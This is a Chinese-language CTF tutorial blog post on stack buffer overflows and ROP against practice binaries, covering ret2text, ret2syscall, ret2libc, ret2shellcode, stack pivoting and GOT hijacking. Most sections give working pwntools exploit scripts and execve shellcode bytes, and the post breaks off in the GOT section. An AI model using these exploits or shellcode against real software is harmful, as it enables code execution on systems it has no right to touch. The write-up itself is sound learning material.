<h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn1" target="_blank" rel="noopener">pwn</a></p>
<p>在分析这道题目之前先使用<a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="noopener"><code>checksec</code></a>查看一下该程序的保护情况:</p>
<blockquote>
<p>checksec pwn1</p>
</blockquote>
<a id="more"></a>
<p><img src="http://file.smilehacker.net/1571474474731.png" alt="checksec pwn1"></p>
<p>可以看到开启了<code>NX enabled</code>保护。使用<code>IDA</code>查看下程序的代码</p>
<p><img src="http://file.smilehacker.net/1571474770735.png" alt="IDA加载程序"></p>
<p>发现程序调用了<code>gets</code>函数，并且没有做任何的处理，可以造成了缓冲区溢出。我们需要分析<code>&amp;s</code>到<code>EBP</code>的距离，因为<code>EBP</code>后存放的就是返回地址。 在32位的程序中，就是<code>ebp+4</code>。<code>Esp -&gt; ebp</code>, 地址从小到大。小地址栈顶，大地址栈底。 </p>
<h3 id="手动计算返回地址的偏移"><a href="#手动计算返回地址的偏移" class="headerlink" title="手动计算返回地址的偏移"></a>手动计算返回地址的偏移</h3><p>工具用起来比较简单，就不介绍了，直接通过手动分析。</p>
<p>工具 :  <a href="https://github.com/desword/shellcode_tools" target="_blank" rel="noopener">patternoffset</a> </p>
<p>先使用<code>GDB</code>加载程序,在<code>call _gets</code>前下断，然后运行程序，关于<code>GDB</code>的使用参考：<a href="https://blog.pwntools.xyz/2019/10/20/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#more">GDB</a></p>
<pre><code class="shell">pwndbg&gt; disassemble main #查看main函数的汇编代码
Dump of assembler code for function main:
   .... #不删掉篇幅太长
   0x080486ae &lt;+102&gt;:    call   0x8048460 &lt;gets@plt&gt;
   ....
End of assembler dump.

pwndbg&gt; b *main+102 #在main函数偏移102行处下断点

Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.

pwndbg&gt; r #运行程序
</code></pre>
<p>运行结果如下:</p>
<p><img src="http://file.smilehacker.net/1571475799729.png" alt="GDB运行后栈帧的情况"></p>
<p>结合<code>IDA</code>的反编译结果计算<code>ESP</code>到<code>&amp;s</code>的偏移:</p>
<pre><code class="shell">ESP = 0xffffcfa0
EBP = 0Xffffd028
&amp;S = ESP + 1CH = 0xffffcfbc

# &amp;s -&gt; $EBP的距离 offset 
offset = $EBP - $S = 6C[hex] = 108[DEC]

# func return address
return address = 108 + 4 = 112</code></pre>
<h3 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果:"></a>验证结果:</h3><p>用<code>python</code>生成一段字符，然后输入程序，看出错时结果是不是为我们指定的结果</p>
<pre><code class="shell"># 在shell下执行
python -c &quot;print &#39;A&#39;*112 + &#39;BBBB&#39; &quot; &gt; test

# 在GDB中执行
run &lt; test</code></pre>
<p>结果如下,可以看到<code>EIP</code>已经被劫持为<code>0X424242(BBBB)</code>:</p>
<p><img src="http://file.smilehacker.net/1571476789765.png" alt="EIP已被劫持"></p>
<h3 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>接下来尝试在程序中寻找调用系统命令地地方,在<code>IDA</code>中按<code>ALT+T</code>搜索<code>/bin/sh</code>，正好看到有,并且调用了<code>system</code>函数</p>
<p><img src="http://file.smilehacker.net/1571476973841.png" alt="IDA搜索结果"></p>
<p><img src="http://file.smilehacker.net/1571477030249.png" alt="IDA搜索结果"></p>
<p>接下来使用<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"><code>pwntools</code></a>这个库来编写<code>EXP</code>:</p>
<pre><code class="python">from pwn import *

pwn1 = process(&#39;./pwn1&#39;)
sh = 0x804863a
pwn1.sendline(&#39;A&#39; * (112) + p32(sh))
pwn1.interactive()</code></pre>
<p>运行后成功拿到<code>shell</code>,第一关很简单.</p>
<p><img src="http://file.smilehacker.net/1571477253129.png" alt="reverse shell"></p>
<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn2" target="_blank" rel="noopener">pwn2</a></p>
<p><code>cheksec</code>检查保护情况</p>
<p><img src="http://file.smilehacker.net/1571477404317.png" alt="checksec检查保护"></p>
<p><code>IDA</code>查看代码</p>
<p><img src="http://file.smilehacker.net/1571478271475.png" alt="IDA查看代码"></p>
<p>跟第一关不同的是，这里没有<code>system</code>函数给我们调用了。</p>
<h3 id="Linux系统调用"><a href="#Linux系统调用" class="headerlink" title="Linux系统调用"></a>Linux系统调用</h3><p>Linux 的系统调用通过 <code>int 80h</code>实现，用<a href="https://zh.wikipedia.org/w/index.php?title=系统调用号&action=edit&redlink=1" target="_blank" rel="noopener">系统调用号</a>来区分入口函数。操作系统实现系统调用的基本过程是：</p>
<ul>
<li><p>应用程序调用库函数<code>（API）</code>；</p>
</li>
<li><p><code>API</code> 将系统调用号存入 <code>EAX</code>，然后通过中断调用使系统进入内核态；</p>
</li>
<li><p>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</p>
</li>
<li><p>系统调用完成相应功能，将返回值存入 <code>EAX</code>，返回到中断处理函数；</p>
</li>
<li><p>中断处理函数返回到<code>API</code> 中；</p>
</li>
<li><p><code>API</code> 将<code>EAX</code>返回给应用程序。</p>
<p><code>Syscall</code>的函数调用规范为： <code>execve(“/bin/sh”, 0,0)</code></p>
</li>
</ul>
<p>汇编代码如下:</p>
<pre><code class="shell">pop eax,   # 系统调用号载入， execve为0xb
pop ebx,     # 第一个参数， /bin/sh的string
pop ecx,    # 第二个参数，0
pop edx,   # 第三个参数，0
int 0x80,   # 执行系统调用</code></pre>
<p>由于程序内没有<code>system</code>调用，我们需要人为的构造。</p>
<h3 id="查找ROP链"><a href="#查找ROP链" class="headerlink" title="查找ROP链"></a>查找ROP链</h3><p>使用<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPgadget</a> 查找我们需要的命令。从上面的分析可以知道我们需要对4个寄存器进行操作<code>eax</code>,<code>ebx</code>,<code>ecx</code>,<code>edx</code></p>
<p>安装好<code>ROPgadget</code>后执行</p>
<pre><code class="shell"> ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;eax&quot; 
 ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;ebx&quot; 
 ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;ecx&quot; 
 ROPgadget --binary pwn2 --only &#39;pop|ret&#39; | grep &quot;edx&quot; 

 ROPgadget --binary pwn2 --only &#39;int&#39;
 ROPgadget --binary pwn2 --string &#39;/bin/sh&#39;</code></pre>
<p>但是在执行寻找<code>ecx</code>之后发现有一条连续<code>pop ecx; pop ebx</code>的指令,我们可以直接用。当然，分开选用两条</p>
<pre><code class="assembly">pop ebx; ret 
pop ecx; ret</code></pre>
<p>也是完全可以的，但是这里并没有单条<code>pop ecx; ret</code>。不过我们在下面可以用<code>0x0806eb90</code>处这条指令加深理解</p>
<p> <img src="http://file.smilehacker.net/1571496009275.png" alt="搜索结果"></p>
<p>寻找系统调用和需要执行命令的字符串</p>
<p><img src="http://file.smilehacker.net/1571497154238.png" alt="1571497154238"></p>
<p> 这里选择的每一个gadgets都含有<code>ret</code>是为了能够使得程序自动持续的选择堆栈中的指令依次执行。在构造这些gadgets之前，我们通过下面的堆栈指针移动图，来分析一下<code>eip</code>指针的移动，以及对应获取的数据内容。<code>ret</code>指令可以理解成去栈顶的数据作为下次跳转的位置。</p>
<pre><code class="assembly">eip = [esp];

esp = esp+4;

# 或者

pop eip;</code></pre>
<p>此时,我们的堆栈布置如下:</p>
<p><img src="http://file.smilehacker.net/1571551902372.png" alt="堆栈结构"></p>
<p>整个堆栈的调用过程:</p>
<ol>
<li>执行<code>gets</code>函数，发生溢出，返回地址被淹没为<code>0x080bb196</code></li>
<li>跳转到<code>0x080bb196</code>执行代码，取出<code>0xb</code>并返回，栈帧下移到<code>0x0806eb91</code></li>
<li>跳转到<code>0x0806eb91</code>执行代码，取出<code>0</code>，再从<code>0x080be408</code>处取出<code>/bin/bash</code>，分别存入<code>ecx</code>,<code>edx</code>，返回,栈帧下移到<code>0x0806eb6a</code></li>
<li>跳转到<code>0x0806eb6a</code>执行代码，取出<code>0</code>存入<code>edx</code>,栈帧下移到<code>0x08049421</code>处</li>
<li>跳转到<code>0x08049421</code>执行<code>int 0x80</code>中断</li>
</ol>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *

sh = process(&quot;./pwn2&quot;)
pop_eax_ret = 0x080bb196
pop_ecx_ebx_ret = 0x0806eb91
pop_edx_ret = 0x0806eb6a
int_x80 = 0x08049421
binsh = 0x080be408

payload = flat(
    [&#39;A&#39;*112, pop_eax_ret, 0xb, pop_ecx_ebx_ret, 0, binsh, pop_edx_ret,0 ,int_x80])
sh.sendline(payload)
sh.interactive()

</code></pre>
<p>执行<code>EXP</code>，成功拿到<code>shell</code></p>
<p><img src="http://file.smilehacker.net/1571552245667.png" alt="success"></p>
<h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>我们用<code>0x0806eb90</code>处的指令重新布置栈帧,加深理解</p>
<p><img src="http://file.smilehacker.net/1571496009275.png" alt="搜索结果"></p>
<p>那么此时的栈帧布局就是:</p>
<p><img src="http://file.smilehacker.net/1571553359527.png" alt="此时栈帧布局"></p>
<p>写出POC：</p>
<pre><code class="python">from pwn import *

sh = process(&quot;./pwn2&quot;)
pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
pop_edx_ret = 0x0806eb6a
int_x80 = 0x08049421
binsh = 0x080be408

payload = flat(
    [&#39;A&#39;*112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh,int_x80])
sh.sendline(payload)
sh.interactive()
</code></pre>
<p>成功执行:</p>
<p><img src="http://file.smilehacker.net/1571553500352.png" alt="成功"></p>
<h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn3" target="_blank" rel="noopener">pwn</a></p>
<p><code>checksec</code>检查保护保护状态:</p>
<p><img src="http://file.smilehacker.net/1571554078794.png" alt="check检查保护状态"></p>
<p><code>IDA</code>查看汇编代码:</p>
<p><img src="http://file.smilehacker.net/1571554361586.png" alt="反编译"></p>
<p>基本跟第二道题目一样，但是我们像第二道题目一样去寻找<code>ROP</code>链的时候发现并没有找到合适的指令</p>
<p><img src="http://file.smilehacker.net/1571554491573.png" alt="寻找指令失败"></p>
<p>那也只能尝试其他的方法了,我们在<code>IDA</code>中查看下他的导入函数,发现其中有<code>system</code>函数,那我们直接调用这个函数即可</p>
<p><img src="http://file.smilehacker.net/1571554930443.png" alt="import导入函数"></p>
<p><img src="http://file.smilehacker.net/1571555353609.png" alt="SYSTEM函数调用"></p>
<p>有了<code>system</code>函数之后,用<code>ROPgadget</code>寻找一下<code>/bin/sh</code>这个字符串.</p>
<p><img src="http://file.smilehacker.net/1571555487359.png" alt="寻找/bin/sh"></p>
<h3 id="EXP编写-1"><a href="#EXP编写-1" class="headerlink" title="EXP编写"></a>EXP编写</h3><pre><code class="python">from pwn import *

sh = process(&quot;./pwn3&quot;)

system_addr= 0x08048460
sh_addr = 0x08048720

payload = flat([&#39;A&#39;*112, system_addr, 0xabcd1122, sh_addr])
sh.sendline(payload)

sh.interactive()
</code></pre>
<p>这里需要注意, 为什么在<code>system_addr</code>和<code>sh_addr</code>中间会有4字节的空余部分?</p>
<p>在正常调用system函数的时候，堆栈位置的<code>system_addr</code>之后的内容为<code>system</code>函数的返回地址，在之后才是新的堆栈的栈顶位置，因此在<code>systetem_addr</code>和<code>sh_addr</code>之间增加了4个字符来进行填充。 </p>
<h2 id="四"><a href="#四" class="headerlink" title="四"></a>四</h2><p>下载地址: <a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn4" target="_blank" rel="noopener">pwn</a></p>
<p><code>checksec</code>检测程序保护机制</p>
<p><img src="http://file.smilehacker.net/1571556472396.png" alt="check检测"></p>
<p>还是一样的，我们再来看程序的导入表:</p>
<p><img src="http://file.smilehacker.net/1571556603660.png" alt="查看导入表"></p>
<p>发现是有<code>system</code>函数的，继续通过<code>ROPgadget</code>分析，发现没有<code>/bin/sh</code>字符串.</p>
<p><img src="http://file.smilehacker.net/1571556697767.png" alt="ROPgadgets分析"></p>
<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>现在得想个法子。直观的想法是在<code>shellcode</code>中，在参数的位置直接放入字符串“/bin/sh”，比如下面这样： </p>
<blockquote>
<p> payload = flat([‘a’ * 112, system_plt, 0xabcdabcd, “/bin/sh”]) </p>
</blockquote>
<p>看着可行,但是放在堆栈中的是程序执行的路线图(都是通过指针调用的)，而不是实际的程序或者字符串 。而 ”/bin/sh”对应的4个字节的地址所指向的内存空间明显不合法。但是如果我们可以把<code>/bin/sh</code>塞到一个变量中，然后让<code>system</code>函数去调用他。我们就可以达到目的。可是这个变量哪里找了？我们可以去看<code>ELF</code>程序的<code>bss</code>段，<code>bss</code>段用于存放程序中未经初始化的全局变量和静态局部变量 。很巧，正好有一个。</p>
<p><img src="http://file.smilehacker.net/1571557290759.png" alt="bss段"></p>
<p>有了地址之后,一个新的问题产生,我们要怎么把<code>/bin/sh</code>塞到<code>buf2</code>这个变量中? 看看导入函数,那个<code>gets</code> :kissing_heart:</p>
<h3 id="EXP编写-2"><a href="#EXP编写-2" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>下面这一段原文作者没有写，都是个人理解，有可能不对，可以看文末的链接</p>
<p>在写<code>EXP</code>之前,我们需要分析一下我们现在的栈帧应该怎么布置:</p>
<p><img src="http://file.smilehacker.net/1571558124555.png" alt="栈帧的布置"></p>
<p>看上去还行，但是又有一个新的问题,<code>gets</code>函数执行完的返回地址我们要怎么填写?程序会被这个返回地址直接带跑，直接填成<code>system</code>的地址？那参数又怎么给到system？</p>
<p>作者在这里的思路是很巧妙的<code>gets</code>函数的返回地址处存指向一条<code>pop x</code>,pop谁都可以，我们主要是利用<code>pop</code>的<code>esp+4</code>的功能。</p>
<pre><code class="shell">ROPgadget --binary pwn4 --only &#39;pop|ret&#39;
</code></pre>
<p>用第一条第三条都可以。</p>
<p><img src="http://file.smilehacker.net/1571558379470.png" alt="ROPgadget运行结果"></p>
<p>整个运行过程如下:</p>
<ol>
<li>程序接收输入,缓冲区溢出,返回地址被淹没成<code>gets</code>函数,并从栈中获取参数</li>
<li>gets函数执行，将<code>/bin/sh</code>设置到<code>buf2</code>中，gets函数执行完成</li>
<li>程序去我们设置的<code>gets</code>函数执行完的返回地址中执行<code>pop; ret</code>指令</li>
<li><code>system</code>函数开始执行</li>
</ol>
<p>EXP：</p>
<pre><code class="python">from pwn import *

sh = process(&quot;./pwn4&quot;)
shelf = ELF(&quot;./pwn4&quot;)

gets_plt = shelf.plt[&#39;gets&#39;]
system_plt = shelf.plt[&#39;system&#39;]


pop_ebp = 0x0804872f
buf2 = 0x0804A080

payload = flat(
    [&#39;A&#39;*112, gets_plt, pop_ebp, buf2, system_plt, 0xabababab, buf2]
)

sh.sendline(payload)
sh.sendline(&#39;/bin/sh&#39;)
sh.interactive()

</code></pre>
<p>成功获得<code>shell</code></p>
<p><img src="http://file.smilehacker.net/1571558914053.png" alt="成功"></p>
<h2 id="五"><a href="#五" class="headerlink" title="五"></a>五</h2><p>下载地址:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn5" target="_blank" rel="noopener">pwn</a></p>
<p><code>checksec</code>检查保护情况:</p>
<p><img src="http://file.smilehacker.net/1571559117913.png" alt="checksec"></p>
<p>发现关闭了<code>NX</code>保护,也就是说可以在堆栈上执行代码了,但是开启了<code>PIE</code>保护,也就是地址随机化,而且程序也变成了64位程序。</p>
<blockquote>
<p>PS: 之前看逆向工程权威指南隐约记得传参不一样,这里刚好又出现了。</p>
<p><code>MSVC</code>和<code>GCC</code>在传参时的不同: </p>
<ul>
<li><code>GCC</code>编译的程序在入参时使用<code>mov</code>指令来传参,不像<code>MSVC</code>传参使用push和pop</li>
</ul>
<p><code>GCC</code>编译64位程序和32位程序入参时的不同(对比上面的题目和本题目汇编代码即可看出):</p>
<ul>
<li><code>GCC</code>编译的32位程序在入参时是直接对堆栈进行操作的</li>
<li><code>GCC</code>编译的64位程序在入参时使用<code>RDI</code>,<code>RSI</code>,<code>RDX</code>,<code>RCX</code>,<code>R8</code>,<code>R9</code>传递前六个参数</li>
</ul>
<p><code>MSVC</code>编译64位程序和32位程序入参时的不同(没有例子):</p>
<ul>
<li><code>MSVC</code>编译的32位程序直接使用push指令入栈</li>
<li><code>MSVC</code>编译的64位程序使用<code>RCX</code>,<code>RDX</code>,<code>R8</code>,<code>R9</code>传递前4个参数</li>
</ul>
</blockquote>
<p><code>IDA</code>分析程序:</p>
<p><img src="http://file.smilehacker.net/1571559310062.png" alt="IDA分析pwn5"></p>
<h3 id="确定漏洞位置"><a href="#确定漏洞位置" class="headerlink" title="确定漏洞位置"></a>确定漏洞位置</h3><p>一眼就看到了<code>read</code>函数,但是他只读了<code>0x40</code>个字节(64)字节</p>
<h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><p>现在很熟练了,偏移<code>0x10h</code>个字节,也就是16个字节.然后16+8=24，也就是我们在输入到24个字节是就可以覆盖返回地址</p>
<h3 id="查看可用函数"><a href="#查看可用函数" class="headerlink" title="查看可用函数"></a>查看可用函数</h3><p>看一下导入函数,发现啥也没</p>
<p><img src="http://file.smilehacker.net/1571559651228.png" alt="查看导入函数"></p>
<p>但是堆栈可以执行,我们需要直接放<code>shellcode</code>放在栈中,在这之前我们要计算一下堆栈中可以存放多少字节的<code>shellcode</code>。</p>
<blockquote>
<p>64 - 24 -8 =32 （返回地址自身的8个自己要记得计算)</p>
</blockquote>
<p><code>expoloit-db</code>上找一段下来:</p>
<pre><code class="assembly"># 23 bytes
# https://www.exploit-db.com/exploits/36858/
shellcode_x64 = &quot;x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05&quot;
</code></pre>
<p>好了,啥都有了,继续思考，怎么确定<code>payload</code>的地址?</p>
<p>那就是<code>buf</code>+32个字节,那新的问题又出来了,<code>buf</code>的地址没法确认(因为程序启用了随机化地址保护)</p>
<p>无解了。再回去看一下程序的代码，这个<code>printf</code>函数干了什么。它把<code>buf</code>的地址给打印出来了:sweat:</p>
<p>妙啊~</p>
<p>然后整理一下，看缓冲区怎么布置</p>
<p><img src="http://file.smilehacker.net/1571560805846.png" alt="缓冲区布置"></p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *

sh = process(&#39;./pwn5&#39;)
# 23 bytes
# https://www.exploit-db.com/exploits/36858/
shellcode_x64 = &quot;x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05&quot;
sh.recvuntil(&#39;[&#39;)
buf_addr = sh.recvuntil(&#39;]&#39;, drop=True)
buf_addr = int(buf_addr, 16)
payload = &#39;b&#39; * 24 + p64(buf_addr + 32) + shellcode_x64
sh.sendline(payload)
sh.interactive()
~                      
</code></pre>
<p>参考一下就好,代码并不能运行。没有细看过<code>pwntools</code>模块,也就不做调试了。</p>
<h2 id="六"><a href="#六" class="headerlink" title="六"></a>六</h2><p>下载地址:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn6" target="_blank" rel="noopener">pwn</a></p>
<p><code>checksec</code>检查程序:</p>
<p><img src="http://file.smilehacker.net/1571561335922.png" alt="checksec检查pwn6"></p>
<p>啥也没开,别激动,不好搞。</p>
<p>IDA查看代码:</p>
<p><img src="http://file.smilehacker.net/1571561531179.png" alt="IDA分析pwn6"></p>
<h3 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h3><p>一眼就看到<code>gets</code>函数了,但是空间只有<code>0x32</code>即50字节</p>
<h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>现在计算很快了,0x20 + 4 = 0x24 = 32个字节,即淹没32字节即可淹没返回地址</p>
<h3 id="导入函数表"><a href="#导入函数表" class="headerlink" title="导入函数表"></a>导入函数表</h3><p>不截图了, 没有<code>system</code>函数</p>
<h3 id="思考（想不通就配合下面的图片）"><a href="#思考（想不通就配合下面的图片）" class="headerlink" title="思考（想不通就配合下面的图片）"></a>思考（想不通就配合下面的图片）</h3><p>现在没招了,用<code>shellcode</code>? 看看现在的空间50-36-4=10，谁有10字节的<code>shellcode</code>赶紧拿出来。</p>
<p>溢出时没得想了，但是我们可以考虑把<code>shellcode</code>作为正常的参数传入栈中,而且栈也是有可执行权限的(没有启用<code>NX</code>)，这样,我们就有36个字节用来存放<code>shellcode</code>了。找到了新思路，我们需要思考两个问题</p>
<ol>
<li>如何找到<code>shellcode</code>起始地址</li>
<li>如何跳转到<code>sellcode</code>的起始地址</li>
</ol>
<p>先解决第一个问题</p>
<p> 漏洞函数产生的位置是在<code>vul</code>函数中,当<code>vul</code>函数执行完成后返回<code>main</code>函数栈帧,我们可以倒推回<code>s</code>的起始位置，即</p>
<blockquote>
<p>esp - 0x20(s的长度) -0x4(vul的返回地址) - 0x4(vul函数的ebp)=0x28</p>
</blockquote>
<p>所以,我们已经推算处<code>shellcode</code>的位置。</p>
<p>解决第二个问题</p>
<p>在函数的返回地址，我们需要一段指令让程序可以跳转到跳转到<code>esp</code>,这样才能继续执行栈帧上的代码:</p>
<pre><code class="shell">ROPgadget --binary stack_pivoting_1 --only &#39;jmp|ret&#39; | grep &#39;esp&#39;
</code></pre>
<p><img src="http://file.smilehacker.net/1571571949860.png" alt="寻找jmp esp"></p>
<p>继续回到栈帧执行代码,我们在栈帧之后布置如下指令.</p>
<pre><code class="assembly">sub esp 0x28; 
jmp esp;
</code></pre>
<p><code>shellcode</code>得到执行。</p>
<p>看一下当前栈帧的布局:</p>
<p><img src="http://file.smilehacker.net/1571572971883.png" alt="当前栈帧布局"></p>
<p>仔细想想,不太好懂。</p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *

sh = process(&#39;./pwn6&#39;)

shellcode_x86 = &quot;x31xc9xf7xe1x51x68x2fx2fx73&quot;
shellcode_x86 += &quot;x68x68x2fx62x69x6ex89xe3xb0&quot;
shellcode_x86 += &quot;x0bxcdx80&quot;

sub_esp_jmp = asm(&#39;sub esp, 0x28;jmp esp&#39;)
jmp_esp = 0x08048504
payload = shellcode_x86 + (
    0x20 - len(shellcode_x86)) * &#39;b&#39; + &#39;bbbb&#39; + p32(jmp_esp) + sub_esp_jmp
sh.sendline(payload)
sh.interactive()
</code></pre>
<p>没办法成功执行,换了个<code>x86</code>平台的shell，我感觉这个<code>shellcode</code>有问题！！</p>
<h2 id="七"><a href="#七" class="headerlink" title="七"></a>七</h2><p>下载地址: <a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn7" target="_blank" rel="noopener">pwn7</a></p>
<p>上来还老规矩,使用<code>checksec</code>检查程序保护情况:</p>
<p><img src="http://file.smilehacker.net/1572240054879.png" alt="checksec检查pwn7"></p>
<p>只开启了<code>DEP</code>保护。<code>IDA</code>查看掠过，漏洞函数还是一样的，但是没有导入函数,没有合适的<code>Gadget</code>语句。怎么办？</p>
<p>劫持<code>GOT</code></p>
<h3 id="Hijack-GOT"><a href="#Hijack-GOT" class="headerlink" title="Hijack GOT"></a>Hijack GOT</h3><blockquote>
<p>修改某个被调用函数的地址，让其指向另一个函数。</p>
<p>example : 修改<code>printf()</code>函数的地址使其指向<code>system()</code>函数</p>
</blockquote>
<p>要实现上述过程，我们就需要理解一下函数调用时，程序是怎么找到被<code>调用函数</code>的？</p>
<p>程序在对外部的函数调用时需要在生成可执行文件时包含“外部函数的链接”到程序中,链接的方式分为两种：</p>
<ul>
<li>静态链接: 静态链接生成的可执行文件包含外部函数的全部代码</li>
<li>动态链接: 动态链接生成的可执行文件不包含外部函数的代码，而是运行时将，动态链接库（若干外部函数的集合）加载到内存的某个位置，在发生函数调用时去链接库定位所需的函数。 </li>
</ul>
<p>那就出现了一个新的问题。程序如何在链接库内定位到所需函数？这个过程用到两张表<code>GOT</code>和<code>PLT</code></p>
<ul>
<li><code>GOT</code>：全局偏移量表(<strong>G</strong>lobal <strong>O</strong>ffset <strong>T</strong>able)， 用来存储外部函数在内存的确切地址。<ul>
<li><code>GOT</code>存储在数据段中(<code>Data Segment</code>)，<strong>可以在程序运行时被修改</strong></li>
</ul>
</li>
<li><code>GIT</code>：程序链接表(<strong>P</strong>rocedure <strong>L</strong>inkage <strong>T</strong>able)，用来存储外部函数的入口点。程序运行时到<code>PLT</code>表中寻找外部函数的地址。<ul>
<li><code>PLT</code>存储在代码段(Code Segment)内，在运行之前就已经确定并且不会被修改，所以<code>PLT</code> 并不会知道程序运行时动态链接库被加载的确切位置。 </li>
</ul>
</li>
</ul>
<p>那么<code>PLT</code>表内存储的入口点是什么?</p>
<ul>
<li><p>存储的是<code>GOT</code>表中对应条数的地址</p>
<p><img src="http://file.smilehacker.net/1572242662913.png" alt="PLT存储"></p>
</li>
</ul>
<p>既然外部函数地址都存放在<code>GOT</code>中,而不是<code>PLT</code>，<code>PLT</code>存储的入口点又指向<code>GOT</code>的对应条目，那程序为什么选在<code>PLT</code>作为函数的入口点，而不是<code>GOT</code>? 在程序启动时确定所有外部函数的内存地址并写入<code>GOT</code>表，之后只使用<code>GOT</code>表不是更方便吗？ </p>
<ul>
<li>这样设计的目的是因为效率。</li>
</ul>
<p><code>GOT</code>表的<strong>初始值</strong>都指向<code>PLT</code>表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。</p>
<p>当程序需要调用某个外部函数时，过程如下</p>
<ul>
<li>首先到<code>PLT</code>表内寻找对应的入口点，跳转到<code>GOT</code>表中。</li>
<li>第一次调用这个函数：<ul>
<li>程序会通过<code>GOT</code>表再次跳转回<code>PLT</code>表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉<code>GOT</code>表的初始值，之后再执行函数调用,</li>
</ul>
</li>
<li>不是第一次调用(再次调用)：<ul>
<li>程序仍然首先通过<code>PLT</code>表跳转到<code>GOT</code>表，此时<code>GOT</code>表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。</li>
</ul>
</li>
</ul>
<p>第一次调用的示意图:</p>
<p> <img src="http://file.smilehacker.net/v2-b78288c5eb8bfd2568728f34fbbb0e9e_hd.png" alt="第一次调用"> </p>
<p>不是第一次调用的示意图:</p>
<p> <img src="http://file.smilehacker.net/v2-caa5320d0bb0101edad4b9127f6fe413_hd.png" alt="不是第一次调用"></p>
<p>上面的这个过程采用了<code>LAZY</code>设计思想, 它将需要完成的操作(解析外部函数的内存地址)留到调用实际发生时才进行，而非在程序一开始运行时就解析出全部函数地址。跟<code>python</code>中的生成器有点像，懒加载</p>
<p>这个过程也启示了我们如何实现函数的伪装，那就是到<code>GOT</code>表中将函数<code>A</code>的地址修改为函数<code>B</code>的地址。这样在后面所有对函数<code>A</code>的调用都会执行函数<code>B</code>。我们可以将目标分解成以下几个步骤:</p>
<ul>
<li>确定函数<code>A</code>在<code>GOT</code>表中的条目位置 </li>
<li>确定函数<code>B</code>在内存中的地址 </li>
<li>将函数<code>B</code>的地址写入函数<code>A</code>在<code>GOT</code>表中的条目</li>
</ul>
<p>第一个问题，如何确认函数<code>A</code>在<code>GOT</code>表中的位置?</p>
<p>这个问题好说，程序调用函数时是通过<code>PLT</code>表跳转到 GOT 表的对应条目，所以可以在函数调用的汇编指令中找到<code>PLT</code>表中该函数的入口点位置，从而定位到该函数在<code>GOT</code>中的条目。 </p>
<pre><code class="assembly">call 0x08048430 &lt;printf@plt&gt;
</code></pre>
<p>就说明<code>printf</code>在<code>PLT</code>表中的入口点是在 <em>0x08048430*，所以 *0x08048430</em> 处存储的就是<code>GOT</code>表中<code>printf</code>的条目地址。 </p>
<p>第二个问题， 如何确定函数 B 在内存中的地址？ </p>
<p>如果开启了<code>ASLR</code>，程序每次动态加载的位置都是随机的，就很难直接定位函数位置。假如函数<code>B</code>已经调用过了，我们通过上一个问题的答案来拿到结果，但是，我们想要的函数系统一般又不会调用，<code>GOT</code>表中并没有相应的记录。那怎么办? 幸运的是，函数在动态链接库内的相对位置是固定的，在动态库打包生成时就已经确定。所以假如我们知道了函数<code>A</code>的运行时地址（读取<code>GOT</code>表内容），也知道函数<code>A</code>和函数<code>B</code>在动态链接库内的相对位置，就可以推算出函数<code>B</code>的运行时地址。 </p>
<p>最后，如何实现 GOT 表中数据的修改？ </p>
<p><code>ROP</code>,不多说了</p>
<p>从上面也可以看出，修改<code>GOT</code>表也可以在一定程度上绕过<code>ASLR</code></p>
<h3 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h3><p>看了上面的分析，应该是有个大概的思路了。这里的思路并不是修改某个函数的<code>got</code>记录，而是根据偏移计算出<code>system</code>的地址</p>
<p>先来想第一个问题，如何拿到<code>system</code>函数的地址?我们需要记住两点`</p>
<ul>
<li><code>system</code>函数属于<code>libc</code>，而<code>libc.so</code>动态链接库中的函数之间相对偏移是固定的。</li>
